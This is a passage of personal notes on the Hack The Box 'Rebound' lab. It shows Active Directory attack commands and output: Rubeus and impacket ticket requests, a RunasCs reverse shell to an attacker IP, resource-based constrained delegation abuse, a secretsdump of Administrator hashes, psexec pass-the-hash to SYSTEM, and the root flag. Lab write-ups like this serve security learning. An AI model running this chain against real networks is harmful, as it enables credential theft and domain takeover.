+C:\Users\winrm_svc\Documents&gt;.\Rubeus.exe asktgt /user:tbrady /domain:rebound.htb /aes256:5C634AFA0FFAF0AD3AC04FDD47FFD995362B17B6260172644F3723CFCD3D280F
+.\Rubeus.exe asktgt /user:tbrady /domain:rebound.htb /aes256:5C634AFA0FFAF0AD3AC04FDD47FFD995362B17B6260172644F3723CFCD3D280F
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0 
+
+[*] Action: Ask TGT
+
+[*] Using aes256_cts_hmac_sha1 hash: 5C634AFA0FFAF0AD3AC04FDD47FFD995362B17B6260172644F3723CFCD3D280F
+[*] Building AS-REQ (w/ preauth) for: &#x27;rebound.htb\tbrady&#x27;
+[*] Using domain controller: ::1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+      dGd0GwtyZWJvdW5kLmh0Yg==
+
+  ServiceName              :  krbtgt/rebound.htb
+  ServiceRealm             :  REBOUND.HTB
+  UserName                 :  tbrady
+  UserRealm                :  REBOUND.HTB
+  StartTime                :  9/13/2023 3:48:11 AM
+  EndTime                  :  9/13/2023 1:48:11 PM
+  RenewTill                :  9/20/2023 3:48:11 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  a2cljjxAvSBkk3Wxl92LAAHU/GO3bTTvqM3NwvMYUpM=
+  ASREP (key)              :  5C634AFA0FFAF0AD3AC04FDD47FFD995362B17B6260172644F3723CFCD3D280F</code></pre><p id="351046cd-1efe-430c-8f30-c05dd8019f63" class="">
+</p><p id="9f09c8da-eaf2-4271-902b-72bab8c5fd8e" class="">got shell as tbrady</p><p id="a5f04797-01cf-4813-ab30-6edcbcd237b2" class=""><code>.\RunasCs.exe tbrady 543BOMBOMBUNmanda powershell -r 10.10.14.4:4444</code></p><p id="32372155-2cf6-4cf1-99f1-103848211cfc" class="">
+</p><p id="ccd41e77-7a04-49c3-ae4a-412befc9602d" class="">
+</p><p id="d5d645f8-3e46-47d0-a9fe-f39188cd6b5a" class="">Basically it comes to this</p><ol type="1" id="a14e4827-eb5f-42ce-a18f-e0146f9f6a7f" class="numbered-list" start="1"><li>Find all valid users on the domain - SID bruteforce and rpcclient</li></ol><ol type="1" id="3163d7e9-708b-4ccd-a40f-d5050ce64cd6" class="numbered-list" start="2"><li>Use the user that does not have kerberos pre-auth set to check for SPNs against the user list - one user does not have that Jones and we can send a request with pre-auth GetUserSPNs.py</li></ol><ol type="1" id="0a3c3f0f-470b-44a0-98c4-801df4a427f0" class="numbered-list" start="3"><li>Crack the TGS of the ldap_monitor (hashcat mode 13100 is for TGS...)</li></ol><ol type="1" id="b8cad3da-48d9-4dbd-bb7a-77d42d313682" class="numbered-list" start="4"><li>Check which other user may use the same password - password spray the domain with the user list found and see which other users come up and use the same password</li></ol><ol type="1" id="685cfd44-a371-4a70-9079-dfae47506193" class="numbered-list" start="5"><li>Check the ACLs for this particular user - now here the issue is that bloodhound did not work for me, I could not log anything as the LDAP server would not accept. Maybe I was missing something like an additional flag or anything else?</li></ol><ol type="1" id="0d95ea5a-d51f-4d20-8870-d1bb76e3f389" class="numbered-list" start="6"><li>Find a way to get to the ServiceMgmt group - we can move the user we found with pass spraying to that group which has permissions to the OU Service Users. Additionally adding the genericAll write to the user within the group should allow us to further modify the user winrm_svc password who can remotely access the domain.</li></ol><ol type="1" id="59ebec99-fccd-4169-b401-ce64b91badf0" class="numbered-list" start="7"><li>Abuse the permission that this group has to be able to connect to the DC via winrm - here we should be able to change the password and remote with evil-winrm</li></ol><p id="95f949a8-f741-4997-9192-b776cf074803" class="">The ServiceMgmt group has a GenericAll on the ‘Service Users OU’ - basically with this privilege you could add a GenericAll for a user which will let you for example change the passwords for anyone under the OU —&gt; winrm_svc</p><p id="429cd13b-d488-47a7-bb29-414f423044d6" class="">
+</p><p id="a38085bf-9226-453e-90ad-6d6dfbdd0c4d" class="">So we have tbrady and delegator$ </p><p id="840c85f1-0769-4b1d-a81f-49927aba66eb" class="">Delegator can delegate on browser/dc01.rebound.htb</p><p id="1484097a-14ab-416d-baea-325148d3d812" class="">We can get that right to tbrady and then ask for a ticket to impersonate admin? </p><p id="3a9bf3d3-6d29-4d41-b659-dffbff45693d" class="">
+</p><p id="c1b48ee9-1008-4d73-ac44-e2e3aa63fd5f" class="">
+</p><p id="cf3440fc-1dc7-4010-b150-c940b8c549ab" class="">
+</p><p id="1b3d0d83-447a-4459-99de-fcec969a1b62" class=""><del>Get tbrady ticket </del>did have no use from it</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5ac9b76a-6ea1-42a4-8347-cd9958ab97b6" class="code"><code class="language-PowerShell">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ impacket-getTGT rebound.htb/tbrady@dc01.rebound.htb -dc-ip 10.129.212.77
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+[*] Saving ticket in tbrady@dc01.rebound.htb.ccache</code></pre><p id="a9508b69-3f7a-4ca7-9a3c-4aa2c0aa2978" class="">
+</p><p id="56ceae6e-7846-4ec3-9085-1bce2370c05e" class="">
+</p><p id="2c1d4bd2-d670-4920-ba47-b0f09a216cd9" class="">Final steps and way to get root….</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e6165043-c7cb-45f8-a85d-b6cd58d0952b" class="code"><code class="language-PowerShell">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ impacket-getTGT &#x27;rebound.htb/delegator$@dc01.rebound.htb&#x27; -hashes aad3b435b51404eeaad3b435b51404ee:9b0ccb7d34c670b2a9c81c45bc8befc3 -dc-ip 10.129.212.77
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Saving ticket in delegator$@dc01.rebound.htb.ccache
+                                                                                                     
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ unset KRB5CCNAME
+                                                                                                     
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ export KRB5CCNAME=delegator\$@dc01.rebound.htb.ccache  
+                                                                                                     
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ impacket-rbcd &#x27;rebound.htb/delegator$&#x27; -k -no-pass -delegate-from &#x27;ldap_monitor&#x27; -delegate-to &#x27;delegator$&#x27; -action write -use-ldaps -dc-ip 10.129.212.77 -debug
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[+] Impacket Library Installation Path: /home/yougotgot/.local/lib/python3.11/site-packages/impacket
+[+] Using Kerberos Cache: delegator$@dc01.rebound.htb.ccache
+[+] SPN LDAP/DC01@REBOUND.HTB not found in cache
+[+] AnySPN is True, looking for another suitable SPN
+[+] Returning cached credential for KRBTGT/REBOUND.HTB@REBOUND.HTB
+[+] Using TGT from cache
+[+] Trying to connect to KDC at 10.129.212.77:88
+[+] Initializing domainDumper()
+[*] Accounts allowed to act on behalf of other identity:
+[*]     DC01$        (S-1-5-21-4078382237-1492182817-2568127209-1000)
+[*] Delegation rights modified successfully!
+[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     DC01$        (S-1-5-21-4078382237-1492182817-2568127209-1000)
+[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
+                                                                                                     
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ impacket-getTGT &#x27;rebound.htb/ldap_monitor:1GR8t@$$4u&#x27;
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Saving ticket in ldap_monitor.ccache
+                                                                                                     
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ unset KRB5CCNAME
+                                                                                                     
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ export KRB5CCNAME=ldap_monitor.ccache
+                                                                                                     
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ impacket-getST -spn &quot;browser/dc01.rebound.htb&quot; -impersonate &quot;dc01$&quot; &quot;rebound.htb/ldap_monitor&quot; -k -no-pass
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Impersonating dc01$
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in dc01$.ccache
+                                                                                                     
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ export KRB5CCNAME=dc01\$.ccache 
+                                                                                                     
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ impacket-getST -spn &quot;http/dc01.rebound.htb&quot; -impersonate &quot;dc01$&quot; -additional-ticket &quot;dc01$.ccache&quot; &quot;rebound.htb/delegator$&quot; -aesKey 9861cac50c316fadde60e00ec4a3c63852afbe05443343cdb011be5f1d4ddc2b -k -no-pass
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting TGT for user
+[*] Impersonating dc01$
+[*]     Using additional ticket dc01$.ccache instead of S4U2Self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in dc01$.ccache
+                                                                                                     
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ impacket-secretsdump -no -k dc01.rebound.htb -just-dc-user administrator
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
+Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
+Administrator:des-cbc-md5:ad8ac2a825fe1080
+[*] Cleaning up... 
+                                                                                                     
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ psexec.py -hashes &#x27;:176be138594933bb67db3b2572fc91b8&#x27; Administrator@10.129.212.77
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.129.212.77.....
+[*] Found writable share ADMIN$
+[*] Uploading file qHzLPvLA.exe
+[*] Opening SVCManager on 10.129.212.77.....
+[*] Creating service GHDe on 10.129.212.77.....
+[*] Starting service GHDe.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.4720]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; cd C:\Users
+ 
+C:\Users&gt; whoami
+nt authority\system
+
+C:\Users&gt;
+
+C:\Users\Administrator\Desktop&gt; type root.txt
+efaffba08365f82da5c20a3178036e0f</code></pre><h3 id="a2e31e93-5925-4db6-adb6-1dbeadfc59fa" class=""><mark class="highlight-teal">root: efaffba08365f82da5c20a3178036e0f</mark></h3><p id="d03f1123-94fd-4a90-8114-2d2a11cc443d" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
